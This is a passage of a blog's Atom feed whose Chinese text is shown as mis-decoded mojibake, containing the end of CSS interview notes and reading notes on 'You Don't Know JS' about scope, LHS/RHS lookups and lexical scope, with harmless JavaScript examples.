‡ç­¾æŒ‰é’®text-indentå€¼æœ‰æ•ˆã€‚</p><p>ï¼ˆ5ï¼‰text-indentçš„ç™¾åˆ†æ¯”å€¼æ˜¯ç›¸å¯¹äºå½“å‰å…ƒç´ çš„â€œåŒ…å«å—â€è®¡ç®—çš„ï¼Œè€Œä¸æ˜¯å½“å‰å…ƒç´ ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ¬æ–‡æ˜¯æˆ‘åœ¨å¤ä¹ CSSï¼Œå‡†å¤‡å®ä¹ é¢è¯•æ—¶æ•´ç†çš„ç¬”è®°ï¼Œå‚è€ƒè‡ªä¸€äº›å·²ç»æ•´ç†å¥½çš„åšå®¢ï¼š&lt;a href=&quot;https://github.com/Cavs</summary>
      
    
    
    
    <category term="é¢è¯•å‡†å¤‡" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="CSS" scheme="http://example.com/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>ã€é˜…è¯»ç¬”è®°ã€‘â€” â€” ä½ ä¸çŸ¥é“çš„JavaScriptï¼ˆä¸Šï¼‰</title>
    <link href="http://example.com/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://example.com/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2021-06-24T21:29:02.000Z</published>
    <updated>2021-07-01T13:12:05.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯é˜…è¯»ã€Šä½ ä¸çŸ¥é“çš„Javascriptã€‹ï¼ˆä¸Šï¼‰çš„ç¬”è®°ï¼Œå¤§éƒ¨åˆ†å†…å®¹å€Ÿé‰´äº†<a href="https://juejin.cn/post/6844903725249593351#heading-6">shotCatå¤§ç¥çš„æ–‡ç« </a>ï¼Œå› ä¸ºè¿™ç¯‡å·²ç»æ€»ç»“çš„å¾ˆå¥½äº†ï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ è‡ªå·±çš„ç†è§£ï¼Œæ–¹ä¾¿ä»Šåå­¦ä¹ å¤ä¹ javascriptã€‚ï¼ˆä¾µæƒåˆ ï¼‰</p><h1 id="ç¬¬ä¸€éƒ¨åˆ†-ä½œç”¨åŸŸå’Œé—­åŒ…"><a href="#ç¬¬ä¸€éƒ¨åˆ†-ä½œç”¨åŸŸå’Œé—­åŒ…" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† ä½œç”¨åŸŸå’Œé—­åŒ…"></a>ç¬¬ä¸€éƒ¨åˆ† ä½œç”¨åŸŸå’Œé—­åŒ…</h1><h2 id="ç¬¬ä¸€ç« -ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆ"><a href="#ç¬¬ä¸€ç« -ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆ" class="headerlink" title="ç¬¬ä¸€ç«  ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆ"></a>ç¬¬ä¸€ç«  ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆ</h2><h3 id="1-1-ç¼–è¯‘åŸç†"><a href="#1-1-ç¼–è¯‘åŸç†" class="headerlink" title="1.1 ç¼–è¯‘åŸç†"></a>1.1 ç¼–è¯‘åŸç†</h3><p><strong>ä¼ ç»Ÿç¼–è¯‘çš„ä¸‰ä¸ªæ­¥éª¤</strong></p><ul><li><strong>1ï¼Œåˆ†è¯/è¯æ³•åˆ†æ :</strong> è¿™ä¸ªè¿‡ç¨‹ä¼šå°†ç”±å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²åˆ†è§£æˆæœ‰æ„ä¹‰çš„ä»£ç å—ï¼Œè¿™äº›ä»£ç å—è¢«ç§°ä¸ºè¯æ³•å•å…ƒ(token)ã€‚ä¾‹å¦‚ var a = 2; é€šå¸¸ä¼šè¢«åˆ†è§£æˆ varã€aã€=ã€2ã€; ç©ºæ ¼æ˜¯å¦æœ‰æ•ˆå–å†³äºè¿™é—¨è¯­è¨€ã€‚</li><li><strong>2ï¼Œè§£æ/è¯­æ³•åˆ†æ:</strong> è¿™ä¸ªè¿‡ç¨‹æ˜¯å°†è¯æ³•å•å…ƒæµè½¬æ¢æˆä¸€ä¸ªç”±å…ƒç´ é€çº§åµŒå¥—æ‰€ç»„æˆçš„ä»£è¡¨äº†ç¨‹åºè¯­æ³•ç»“æ„çš„æ ‘â€”â€”â€œ<strong>æŠ½è±¡è¯­æ³•æ ‘</strong>â€(Abstract Syntax Treeï¼ŒAST)ã€‚</li><li><strong>3ï¼Œä»£ç ç”Ÿæˆ:</strong> å°† AST è½¬æ¢ä¸ºå¯æ‰§è¡Œä»£ç çš„è¿‡ç¨‹ç§°è¢«ç§°ä¸ºä»£ç ç”Ÿæˆã€‚è¿™ä¸ªè¿‡ç¨‹ä¸è¯­è¨€ã€ç›®æ ‡å¹³å°ç­‰æ¯æ¯ç›¸å…³ã€‚æŠ›å¼€å…·ä½“ç»†èŠ‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯æœ‰æŸç§æ–¹æ³•å¯ä»¥å°† var a = 2; çš„ AST è½¬åŒ–ä¸ºä¸€ç»„æœºå™¨æŒ‡ä»¤ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªå«ä½œ a çš„å˜é‡(åŒ…æ‹¬åˆ†é…å†…å­˜ç­‰)ï¼Œå¹¶å°†ä¸€ä¸ªå€¼å‚¨å­˜åœ¨ a ä¸­ã€‚</li></ul><p><em><strong>è¯´æ˜:</strong></em> æ­¤å¤„åªéœ€è®°ä½ç¬¬ä¸€æ­¥:åˆ†è¯/è¯æ³•åˆ†æ.ç¬¬äºŒæ­¥:è§£æ/è¯­æ³•åˆ†æï¼Œå¾—åˆ°æŠ½è±¡è¯­æ³•æ ‘(AST).ç¬¬ä¸‰æ­¥:ä»£ç ç”Ÿæˆï¼Œå°†æŠ½è±¡è¯­æ³•æ ‘è½¬æ¢ä¸ºæœºå™¨æŒ‡ä»¤.</p><h3 id="1-2-ç†è§£ä½œç”¨åŸŸ"><a href="#1-2-ç†è§£ä½œç”¨åŸŸ" class="headerlink" title="1.2 ç†è§£ä½œç”¨åŸŸ"></a>1.2 ç†è§£ä½œç”¨åŸŸ</h3><h4 id="1-2-1-ä»£ç ç¼–è¯‘åˆ°æ‰§è¡Œçš„å‚ä¸è€…"><a href="#1-2-1-ä»£ç ç¼–è¯‘åˆ°æ‰§è¡Œçš„å‚ä¸è€…" class="headerlink" title="1.2.1 ä»£ç ç¼–è¯‘åˆ°æ‰§è¡Œçš„å‚ä¸è€…"></a>1.2.1 ä»£ç ç¼–è¯‘åˆ°æ‰§è¡Œçš„å‚ä¸è€…</h4><p>**var a = 2;**å½“æˆ‘ä»¬å†™äº†var a =2;ä¹‹åéœ€è¦å¼•æ“ï¼Œç¼–è¯‘å™¨ï¼Œä½œç”¨åŸŸçš„å…±åŒå‚ä¸ã€‚</p><ul><li><strong>å¼•æ“</strong>ã€‚ä»å¤´åˆ°å°¾è´Ÿè´£æ•´ä¸ª JavaScript ç¨‹åºçš„ç¼–è¯‘åŠæ‰§è¡Œè¿‡ç¨‹ã€‚</li><li><strong>ç¼–è¯‘å™¨</strong>ã€‚è´Ÿè´£è¯­æ³•åˆ†æåŠä»£ç ç”Ÿæˆç­‰è„æ´»ç´¯æ´»ã€‚</li><li><strong>ä½œç”¨åŸŸ</strong>ã€‚è´Ÿè´£æ”¶é›†å¹¶ç»´æŠ¤ç”±æ‰€æœ‰å£°æ˜çš„æ ‡è¯†ç¬¦(å˜é‡)ç»„æˆçš„ä¸€ç³»åˆ—æŸ¥è¯¢ï¼Œå¹¶å®æ–½ä¸€å¥—éå¸¸ä¸¥æ ¼çš„è§„åˆ™ï¼Œç¡®å®šå½“å‰æ‰§è¡Œçš„ä»£ç å¯¹è¿™äº›æ ‡è¯†ç¬¦çš„è®¿é—®æƒé™ã€‚</li></ul><h4 id="1-2-2-ä»£ç ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹"><a href="#1-2-2-ä»£ç ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="1.2.2 ä»£ç ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹"></a>1.2.2 ä»£ç ç¼–è¯‘æ‰§è¡Œè¿‡ç¨‹</h4><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b0e35937a479%EF%BC%9Fw=1186&h=1292&f=png&s=105617" alt="JavaScriptå¯¹var a =2;çš„å¤„ç†è¿‡ç¨‹"></p><p>ï¼ˆè¿™ä¸ªå›¾å¤ªå¥½äº†ï¼ï¼‰</p><h4 id="1-2-3-ä½œç”¨åŸŸçš„LHSæŸ¥è¯¢å’ŒRHSæŸ¥è¯¢"><a href="#1-2-3-ä½œç”¨åŸŸçš„LHSæŸ¥è¯¢å’ŒRHSæŸ¥è¯¢" class="headerlink" title="1.2.3 ä½œç”¨åŸŸçš„LHSæŸ¥è¯¢å’ŒRHSæŸ¥è¯¢"></a>1.2.3 ä½œç”¨åŸŸçš„LHSæŸ¥è¯¢å’ŒRHSæŸ¥è¯¢</h4><p>ç”±ä¸Šå›¾å¯çŸ¥ï¼Œå¼•æ“åœ¨è·å¾—ç¼–è¯‘å™¨ç»™çš„ä»£ç åï¼Œè¿˜ä¼šå¯¹ä½œç”¨åŸŸè¿›è¡Œè¯¢é—®<strong>å˜é‡</strong>ã€‚</p><p>ç°åœ¨å°†ä¾‹å­æ”¹ä¸ºvar a = bï¼›æ­¤æ—¶å¼•æ“ä¼šå¯¹å˜é‡aå’Œå˜é‡béƒ½å‘<strong>ä½œç”¨åŸŸ</strong>è¿›è¡ŒæŸ¥è¯¢ã€‚æŸ¥è¯¢åˆ†ä¸ºä¸¤ç§ï¼š<strong>LHS</strong>ï¼ˆLHS æŸ¥è¯¢è¯•å›¾æ‰¾åˆ°å˜é‡çš„å®¹å™¨æœ¬èº«ï¼Œä»è€Œå¯ä»¥å¯¹å…¶èµ‹å€¼ã€‚ï¼‰å’Œ <strong>RHS</strong>ï¼ˆRHS æŸ¥è¯¢å³ç®€å•åœ°æŸ¥æ‰¾æŸä¸ªå˜é‡çš„å€¼ï¼‰ã€‚å…¶ä¸­Lä»£è¡¨å·¦ï¼ŒRä»£è¡¨å³ã€‚å³å¯¹å˜é‡aè¿›è¡ŒLHSæŸ¥è¯¢.å¯¹å˜é‡bè¿›è¡ŒRHSæŸ¥è¯¢.</p><h4 id="1-2-4-å¼•æ“å’Œä½œç”¨åŸŸçš„å¯¹è¯"><a href="#1-2-4-å¼•æ“å’Œä½œç”¨åŸŸçš„å¯¹è¯" class="headerlink" title="1.2.4 å¼•æ“å’Œä½œç”¨åŸŸçš„å¯¹è¯"></a>1.2.4 å¼•æ“å’Œä½œç”¨åŸŸçš„å¯¹è¯</h4><p>å¼•æ“è¿›è¡ŒLHSå’ŒRHSæŸ¥è¯¢æ—¶éƒ½ä¼šæ‰¾ä½œç”¨åŸŸè¦ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> );</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬æŠŠä¸Šé¢è¿™æ®µä»£ç çš„å¤„ç†è¿‡ç¨‹æƒ³è±¡æˆä¸€æ®µå¯¹è¯ï¼Œè¿™æ®µå¯¹è¯å¯èƒ½æ˜¯ä¸‹é¢è¿™æ ·çš„ã€‚</p><p>å¼•æ“:æˆ‘è¯´ä½œç”¨åŸŸï¼Œæˆ‘éœ€è¦ä¸º foo è¿›è¡Œ RHS å¼•ç”¨ã€‚ä½ è§è¿‡å®ƒå—ï¼Ÿ<br>ä½œç”¨åŸŸ:åˆ«è¯´ï¼Œæˆ‘è¿˜çœŸè§è¿‡ï¼Œç¼–è¯‘å™¨é‚£å°å­åˆšåˆšå£°æ˜äº†å®ƒã€‚å®ƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç»™ä½ ã€‚<br>å¼•æ“:å“¥ä»¬å¤ªå¤Ÿæ„æ€äº†ï¼å¥½å§ï¼Œæˆ‘æ¥æ‰§è¡Œä¸€ä¸‹ fooã€‚<br>å¼•æ“:ä½œç”¨åŸŸï¼Œè¿˜æœ‰ä¸ªäº‹å„¿ã€‚æˆ‘éœ€è¦ä¸º a è¿›è¡Œ LHS å¼•ç”¨ï¼Œè¿™ä¸ªä½ è§è¿‡å—ï¼Ÿ<br>ä½œç”¨åŸŸ:è¿™ä¸ªä¹Ÿè§è¿‡ï¼Œç¼–è¯‘å™¨æœ€è¿‘æŠŠå®ƒå£°åä¸º foo çš„ä¸€ä¸ªå½¢å¼å‚æ•°äº†ï¼Œæ‹¿å»å§ã€‚<br>å¼•æ“:å¤§æ©ä¸è¨€è°¢ï¼Œä½ æ€»æ˜¯è¿™ä¹ˆæ£’ã€‚ç°åœ¨æˆ‘è¦æŠŠ 2 èµ‹å€¼ç»™ aã€‚<br>å¼•æ“:å“¥ä»¬ï¼Œä¸å¥½æ„æ€åˆæ¥æ‰“æ‰°ä½ ã€‚æˆ‘è¦ä¸º console è¿›è¡Œ RHS å¼•ç”¨ï¼Œä½ è§è¿‡å®ƒå—ï¼Ÿ<br>ä½œç”¨åŸŸ:å’±ä¿©è°è·Ÿè°å•Šï¼Œå†è¯´æˆ‘å°±æ˜¯å¹²è¿™ä¸ªã€‚è¿™ä¸ªæˆ‘ä¹Ÿæœ‰ï¼Œconsole æ˜¯ä¸ªå†…ç½®å¯¹è±¡ã€‚ ç»™ä½ ã€‚<br>å¼•æ“:ä¹ˆä¹ˆå“’ã€‚æˆ‘å¾—çœ‹çœ‹è¿™é‡Œé¢æ˜¯ä¸æ˜¯æœ‰ log(..)ã€‚å¤ªå¥½äº†ï¼Œæ‰¾åˆ°äº†ï¼Œæ˜¯ä¸€ä¸ªå‡½æ•°ã€‚<br>å¼•æ“:å“¥ä»¬ï¼Œèƒ½å¸®æˆ‘å†æ‰¾ä¸€ä¸‹å¯¹ a çš„ RHS å¼•ç”¨å—ï¼Ÿè™½ç„¶æˆ‘è®°å¾—å®ƒï¼Œä½†æƒ³å†ç¡®è®¤ä¸€æ¬¡ã€‚<br>ä½œç”¨åŸŸ:æ”¾å¿ƒå§ï¼Œè¿™ä¸ªå˜é‡æ²¡æœ‰å˜åŠ¨è¿‡ï¼Œæ‹¿èµ°ï¼Œä¸è°¢ã€‚<br>å¼•æ“:çœŸæ£’ã€‚æˆ‘æ¥æŠŠ a çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 2ï¼Œä¼ é€’è¿› log(..)ã€‚</p><h3 id="1-3ä½œç”¨åŸŸåµŒå¥—"><a href="#1-3ä½œç”¨åŸŸåµŒå¥—" class="headerlink" title="1.3ä½œç”¨åŸŸåµŒå¥—"></a>1.3ä½œç”¨åŸŸåµŒå¥—</h3><p>å½“ä¸€ä¸ªå—æˆ–å‡½æ•°åµŒå¥—åœ¨å¦ä¸€ä¸ªå—æˆ–å‡½æ•°ä¸­æ—¶ï¼Œå°±å‘ç”Ÿäº†ä½œç”¨åŸŸçš„åµŒå¥—ï¼Œè¿›è€Œå½¢æˆäº†ä¸€æ¡ä½œç”¨åŸŸé“¾ã€‚å› æ­¤ï¼Œåœ¨å½“å‰ä½œç”¨åŸŸä¸­æ— æ³•æ‰¾åˆ°æŸä¸ªå˜é‡æ—¶ï¼Œå¼•æ“å°±ä¼šåœ¨å¤–å±‚åµŒå¥—çš„ä½œç”¨åŸŸä¸­ç»§ç»­æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å˜é‡ï¼Œ æˆ–æŠµè¾¾æœ€å¤–å±‚çš„ä½œç”¨åŸŸ(ä¹Ÿå°±æ˜¯å…¨å±€ä½œç”¨åŸŸ)ä¸ºæ­¢ã€‚</p><h3 id="1-4-å¼‚å¸¸"><a href="#1-4-å¼‚å¸¸" class="headerlink" title="1.4 å¼‚å¸¸"></a>1.4 å¼‚å¸¸</h3><p>ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">console</span>.log( a + b ); </span><br><span class="line">  b = a;</span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> );</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœ RHS æŸ¥è¯¢åœ¨æ‰€æœ‰åµŒå¥—çš„ä½œç”¨åŸŸä¸­éå¯»ä¸åˆ°æ‰€éœ€çš„å˜é‡ï¼Œå¼•æ“å°±ä¼šæŠ›å‡º <strong>ReferenceError</strong> å¼‚å¸¸ã€‚ä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­<code>console.log(a+b)</code>ï¼šç”±äºRHSæ­¤æ—¶æ‰¾ä¸åˆ°bï¼ˆä¸€ä¸ªâ€œæœªå£°æ˜â€çš„å˜ é‡ï¼‰ï¼Œæ•…ä¼šæŠ›å‡ºReferenceErrorã€‚</li><li>å¦‚æœ RHS æŸ¥è¯¢æ‰¾åˆ°äº†ä¸€ä¸ªå˜é‡ï¼Œä½†æ˜¯ä½ å°è¯•å¯¹è¿™ä¸ªå˜é‡çš„å€¼è¿›è¡Œä¸åˆç†çš„æ“ä½œï¼Œ æ¯”å¦‚è¯•å›¾å¯¹ä¸€ä¸ªéå‡½æ•°ç±»å‹çš„å€¼è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œæˆ–ç€å¼•ç”¨ null æˆ– undefined ç±»å‹çš„å€¼ä¸­çš„å±æ€§ï¼Œé‚£ä¹ˆå¼•æ“ä¼šæŠ›å‡ºå¦å¤–ä¸€ç§ç±»å‹çš„å¼‚å¸¸ï¼Œå«ä½œ <strong>TypeError</strong>ã€‚</li><li>å½“å¼•æ“æ‰§è¡Œ LHS æŸ¥è¯¢æ—¶ï¼Œ<strong>å¦‚æœåœ¨é¡¶å±‚(å…¨å±€ä½œç”¨åŸŸ)ä¸­ä¹Ÿæ— æ³•æ‰¾åˆ°ç›®æ ‡å˜é‡ï¼Œå…¨å±€ä½œç”¨åŸŸä¸­å°±ä¼šåˆ›å»ºä¸€ä¸ªå…·æœ‰è¯¥åç§°çš„å˜é‡</strong>ï¼Œå¹¶å°†å…¶è¿”è¿˜ç»™å¼•æ“ï¼Œå‰ææ˜¯ç¨‹åºè¿è¡Œ<strong>åœ¨é â€œä¸¥æ ¼æ¨¡å¼â€ä¸‹</strong>ã€‚ä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­çš„<code>b=a</code></li><li>åœ¨ä¸¥æ ¼æ¨¡å¼ä¸­ LHS æŸ¥è¯¢å¤±è´¥æ—¶ï¼Œå¹¶ä¸ä¼šåˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¼•æ“ä¼šæŠ›å‡ºåŒ RHS æŸ¥è¯¢å¤±è´¥æ—¶ç±»ä¼¼çš„ ReferenceError å¼‚å¸¸ã€‚</li></ul><p>ReferenceError åŒä½œç”¨åŸŸåˆ¤åˆ«å¤±è´¥ç›¸å…³ï¼Œè€Œ TypeError åˆ™ä»£è¡¨ä½œç”¨åŸŸåˆ¤åˆ«æˆåŠŸäº†ï¼Œä½†æ˜¯å¯¹ç»“æœçš„æ“ä½œæ˜¯éæ³•æˆ–ä¸åˆç†çš„ã€‚</p><h3 id="1-5-LHSä¸RHSå°ç»“"><a href="#1-5-LHSä¸RHSå°ç»“" class="headerlink" title="1.5 LHSä¸RHSå°ç»“"></a>1.5 LHSä¸RHSå°ç»“</h3><ul><li>LHSå’ŒRHSæŸ¥è¯¢éƒ½æ˜¯å¼•æ“å¯¹ä½œç”¨åŸŸçš„æŸ¥è¯¢ï¼Œä¸”åªå¯¹å˜é‡è¿›è¡ŒæŸ¥è¯¢</li><li>LHSå’ŒRHSéƒ½ä¼šæ²¿ç€ä½œç”¨åŸŸé“¾è¿›è¡ŒæŸ¥è¯¢ï¼Œç›´åˆ°æœ€ä¸Šå±‚çš„å…¨å±€ä½œç”¨åŸŸ.å¦‚æœæ²¡æ‰¾åˆ°çš„è¯ï¼Œåœ¨éä¸¥æ ¼æ¨¡å¼ä¸‹ï¼ŒLHSåˆ™ä¼šåœ¨å…¨å±€åˆ›å»ºä¸€ä¸ªç›¸åŒåç§°çš„å˜é‡ï¼›RHSåˆ™ä¼šæŠ›å‡ºReferenceErrorçš„å¼‚å¸¸.</li><li>å¦‚æœæŸ¥æ‰¾çš„ç›®çš„æ˜¯å¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨ LHS æŸ¥è¯¢;å¦‚æœç›®çš„æ˜¯è·å–å˜é‡çš„å€¼ï¼Œå°±ä¼šä½¿ç”¨ RHS æŸ¥è¯¢ã€‚</li><li>LHSåªæ˜¯æ‰¾åˆ°å˜é‡çš„å®¹å™¨è€Œå·²ï¼Œæ–¹ä¾¿è¿›è¡Œèµ‹å€¼ï¼ŒRHSæŸ¥è¯¢åˆ™éœ€è¦æ‰¾åˆ°å˜é‡çš„å€¼ã€‚</li><li><code>=</code>æ“ä½œç¬¦æˆ–è°ƒç”¨å‡½æ•°æ—¶ä¼ å…¥å‚æ•°çš„æ“ä½œéƒ½ä¼šå¯¼è‡´å…³è”ä½œç”¨åŸŸçš„èµ‹å€¼æ“ä½œã€‚æ­¤æ—¶éƒ½ä¼šè¿›è¡ŒLHSæŸ¥è¯¢ã€‚</li></ul><h2 id="ç¬¬äºŒç« -è¯æ³•ä½œç”¨åŸŸ"><a href="#ç¬¬äºŒç« -è¯æ³•ä½œç”¨åŸŸ" class="headerlink" title="ç¬¬äºŒç«  è¯æ³•ä½œç”¨åŸŸ"></a>ç¬¬äºŒç«  è¯æ³•ä½œç”¨åŸŸ</h2><p>ä½œç”¨åŸŸåˆ†ä¸ºä¸¤ç§å·¥ä½œæ¨¡å¼:</p><ul><li>1ï¼Œ<strong>è¯æ³•ä½œç”¨åŸŸ</strong>.æ˜¯ç›®å‰æœ€ä¸ºæ™®éçš„ï¼Œè¢«å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€æ‰€é‡‡ç”¨çš„æ¨¡å¼.å½“ç„¶JavaScriptä¹Ÿæ˜¯ä½¿ç”¨çš„è¯æ³•ä½œç”¨åŸŸ.</li><li>2ï¼Œ<strong>åŠ¨æ€ä½œç”¨åŸŸ</strong>.ä½¿ç”¨è¾ƒå°‘ï¼Œæ¯”å¦‚ Bash è„šæœ¬ã€Perl ä¸­çš„ä¸€äº›æ¨¡å¼ç­‰.</li></ul><h3 id="2-1-è¯æ³•é˜¶æ®µ"><a href="#2-1-è¯æ³•é˜¶æ®µ" class="headerlink" title="2.1 è¯æ³•é˜¶æ®µ"></a>2.1 è¯æ³•é˜¶æ®µ</h3><p><strong>è¯æ³•é˜¶æ®µ:</strong> å¤§éƒ¨åˆ†æ ‡å‡†è¯­è¨€ç¼–è¯‘å™¨çš„ç¬¬ä¸€ä¸ªå·¥ä½œé˜¶æ®µå«ä½œè¯æ³•åŒ–(ä¹Ÿå«å•è¯åŒ–)ã€‚è¯æ³•åŒ–çš„è¿‡ç¨‹ä¼šå¯¹æºä»£ç ä¸­çš„å­—ç¬¦è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ˜¯æœ‰çŠ¶æ€çš„è§£æè¿‡ç¨‹ï¼Œè¿˜ä¼šèµ‹äºˆå•è¯è¯­ä¹‰ã€‚</p><p><strong>è¯æ³•ä½œç”¨åŸŸ:</strong> è¯æ³•ä½œç”¨åŸŸå°±æ˜¯å®šä¹‰åœ¨è¯æ³•é˜¶æ®µçš„ä½œç”¨åŸŸï¼Œä¹Ÿè¢«ç§°ä¸ºé™æ€ä½œç”¨åŸŸã€‚å³åœ¨JavaScripté‡Œä½œç”¨åŸŸçš„äº§ç”Ÿæ˜¯åœ¨ç¼–è¯‘å™¨å‡ºæ¥çš„ç¬¬ä¸€é˜¶æ®µè¯æ³•é˜¶æ®µäº§ç”Ÿçš„ï¼Œå¹¶ä¸”æ˜¯ä½ åœ¨ä¹¦å†™å®Œä»£ç æ—¶å°±å·²ç»ç¡®å®šäº†çš„.</p><p><strong>è¯æ³•ä½œç”¨åŸŸä½ç½®:</strong> è¯æ³•ä½œç”¨åŸŸä½ç½®èŒƒå›´å®Œå…¨ç”±å†™ä»£ç æœŸé—´å‡½æ•°æ‰€å£°æ˜çš„ä½ç½®æ¥å†³å®š.</p><p><strong>ç†è§£è¯æ³•ä½œç”¨åŸŸåŠåµŒå¥—:</strong><br>çœ‹ä¸‹ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> b = a * <span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">c</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log( aï¼Œ bï¼Œ c );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bar( b * <span class="number">3</span> ); </span><br><span class="line">&#125;</span><br><span class="line">foo( <span class="number">2</span> ); <span class="comment">// 2ï¼Œ 4ï¼Œ 12</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­æœ‰ä¸‰ä¸ªé€çº§åµŒå¥—çš„ä½œç”¨åŸŸã€‚ä¸ºäº†å¸®åŠ©ç†è§£ï¼Œå¯ä»¥å°†å®ƒä»¬åˆ†æˆ3ä¸ªé€çº§åŒ…å«çš„â€æ°”æ³¡ä½œç”¨åŸŸâ€ã€‚</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b17a466f8fb0%EF%BC%9Fw=2020&h=814&f=png&s=173375"></p><ul><li>1:åŒ…å«ç€æ•´ä¸ªå…¨å±€ä½œç”¨åŸŸï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ªæ ‡è¯†ç¬¦:fooã€‚</li><li>2:åŒ…å«ç€ foo æ‰€åˆ›å»ºçš„ä½œç”¨åŸŸï¼Œå…¶ä¸­æœ‰ä¸‰ä¸ªæ ‡è¯†ç¬¦:aã€bar å’Œ bã€‚</li><li>3:åŒ…å«ç€ bar æ‰€åˆ›å»ºçš„ä½œç”¨åŸŸï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ªæ ‡è¯†ç¬¦:cã€‚</li></ul><p><strong>æ³¨æ„:</strong> æ²¡æœ‰ä»»ä½•å‡½æ•°çš„æ°”æ³¡å¯ä»¥(éƒ¨åˆ†åœ°)åŒæ—¶å‡ºç°åœ¨ä¸¤ä¸ªå¤–éƒ¨ä½œç”¨åŸŸçš„æ°”æ³¡ä¸­ï¼Œå°±å¦‚åŒæ²¡æœ‰ä»»ä½•å‡½æ•°å¯ä»¥éƒ¨åˆ†åœ°åŒæ—¶å‡ºç°åœ¨ä¸¤ä¸ªçˆ¶çº§å‡½æ•°ä¸­ä¸€æ ·ã€‚</p><p><strong>å¼•æ“å¯¹ä½œç”¨åŸŸçš„æŸ¥æ‰¾:</strong><br>è¿™ä¸€éƒ¨åˆ†åœ¨ä¸Šä¸€èŠ‚ä¸­å·²ç»è¯´è¿‡ï¼Œå°±æ˜¯ä»å½“å‰ä½œç”¨åŸŸé€çº§å‘ä¸Šï¼Œç›´åˆ°æœ€ä¸Šå±‚çš„å…¨å±€ä½œç”¨åŸŸã€‚è¿™é‡Œå†è¿›ä¸€æ­¥è¿›è¡Œè®²è§£ï¼š<strong>ä½œç”¨åŸŸæŸ¥æ‰¾ä¼šåœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ ‡è¯†ç¬¦æ—¶åœæ­¢</strong>ã€‚åœ¨å¤šå±‚çš„åµŒå¥—ä½œç”¨åŸŸä¸­å¯ä»¥å®šä¹‰åŒåçš„æ ‡è¯†ç¬¦ï¼Œè¿™å«ä½œâ€œé®è”½æ•ˆåº”â€(å†…éƒ¨çš„æ ‡è¯†ç¬¦â€œé®è”½â€äº†å¤–éƒ¨çš„æ ‡è¯†ç¬¦)ã€‚æŠ›å¼€é®è”½æ•ˆåº”ï¼Œ 